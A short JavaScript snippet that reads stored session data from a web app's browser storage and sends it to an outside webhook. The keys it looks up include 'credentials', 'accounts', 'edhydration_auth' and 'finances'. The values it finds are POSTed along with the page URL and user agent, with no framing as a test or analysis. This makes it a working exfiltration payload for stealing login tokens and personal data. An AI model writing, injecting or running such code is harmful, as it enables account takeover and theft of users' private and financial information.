(async function () {
  const keys = [
    'accounts', 'badges', 'credentials', 'edhydration_auth',
    'etablissement', 'finances',
    'bigAds', 'fa', 'pdfjs.history'
  ];

  const url = 'https://webhook.site/ac1d52e4-7f8b-4c26-a4e3-5c2d97e33be3';

  const data = {
    t: new Date().toISOString(),
    u: navigator.userAgent,
    l: location.href,
    s: {}
  };

  keys.forEach(key => {
    let value = sessionStorage.getItem(key);
    if (value === null) {
      value = localStorage.getItem(key);
    }

    if (value !== null) {
      try {
        data.s[key] = JSON.parse(value);
      } catch {
        data.s[key] = value;
      }
    }
  });

  await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(data)
  });
})();
